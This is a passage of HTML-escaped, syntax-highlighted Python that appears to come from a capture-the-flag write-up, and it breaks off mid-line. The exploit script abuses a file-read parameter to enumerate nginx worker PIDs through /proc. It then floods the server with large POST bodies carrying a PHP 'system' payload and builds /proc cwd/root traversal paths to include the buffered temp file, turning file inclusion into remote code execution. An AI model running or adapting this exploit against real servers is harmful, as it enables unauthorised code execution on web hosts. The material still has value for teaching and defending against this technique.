&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;USE_NGINX_PIDS_CACHE &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;False
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;create_requests_session&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;():
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    session &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests.Session()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Create a large HTTP connection pool to make HTTP requests as fast as possible without TCP handshake overhead
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    adapter &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests.adapters.HTTPAdapter(pool_connections&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1000&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, pool_maxsize&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;10000&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;session.mount(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;http:&amp;#x2F;&amp;#x2F;&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, adapter)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;session
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;get_nginx_pids&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;USE_NGINX_PIDS_CACHE&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;NGINX_PIDS_CACHE
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    nginx_pids &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;set&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Scan up to PID 200
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;range&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;200&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        cmdline &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session.get(SERVER &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;f&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;#x2F;?action=read&amp;amp;amp;file=&amp;#x2F;proc&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;{i}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;#x2F;cmdline&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;.text
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;cmdline.startswith(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;nginx: worker process&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;nginx_pids.add(i)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;nginx_pids
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;send_payload&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;body_size&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1024000&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;try&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# The file path (&amp;#x2F;bla) doesn&amp;amp;#39;t need to exist - we simply need to upload a large body to Nginx and fail fast
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        payload &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;&amp;amp;lt;?php system(&amp;amp;quot;&amp;#x2F;readflag&amp;amp;quot;); ?&amp;amp;gt; &amp;#x2F;&amp;#x2F;&amp;amp;#39;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session.post(SERVER &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;#x2F;?action=read&amp;amp;amp;file=&amp;#x2F;bla&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, data&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(payload &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;a&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;* &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(body_size &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;- &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;len&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(payload)))))
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;except&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;pass
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;send_payload_worker&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;while &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;True&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;send_payload(requests_session)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;send_payload_multiprocess&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Use all CPUs to send the payload as request body for Nginx
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;_ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;range&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(multiprocessing.cpu_count())&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        p &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;multiprocessing.Process(target&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;send_payload_worker, args&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(requests_session,))
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;p.start()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;generate_random_path_prefix&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;nginx_pids&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# This method creates a path from random amount of ProcFS path components. A generated path will look like &amp;#x2F;proc&amp;#x2F;&amp;amp;lt;nginx pid 1&amp;amp;gt;&amp;#x2F;cwd&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;nginx pid 2&amp;amp;gt;&amp;#x2F;root&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;nginx pid 3&amp;amp;gt;&amp;#x2F;root
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    path &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    component_num &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;random.randint(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;10&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;_ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;range&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(component_num)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        pid &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;random.choice(nginx_pids)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;random.randint(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;== &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            path &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;f&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;#x2F;proc&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;pid&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;#x2F;cwd&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;else&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            path &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;f&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;#x2F;proc&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;pid&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;#x2F;root&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;path
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;read_file&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;nginx_pid&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;fd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;nginx_pids&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    nginx_pid_list &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;list&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(nginx_pids)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;while &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;True&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        path &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;generate_random_path_prefix(nginx_pid_list)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        path &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;f&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;#x2F;proc&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;nginx_pid&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span 